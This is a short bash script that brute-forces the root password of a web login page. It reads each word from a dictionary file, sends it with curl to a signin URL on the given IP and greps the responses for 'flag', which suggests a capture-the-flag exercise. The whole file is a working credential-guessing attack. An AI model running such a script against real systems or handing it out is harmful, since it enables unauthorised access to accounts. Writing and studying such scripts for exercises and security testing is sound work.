#/bin/bash
if [ -z "$1" ]
then
	echo 'Usage : ./bruteforce.sh ip'
	exit 0
fi
for line in `cat dictionnary`
do
	echo $line
	curl 'http://'$1'/?page=signin&username=root&password='$line'&Login=Login#' >> trash
	cat trash | grep flag
done
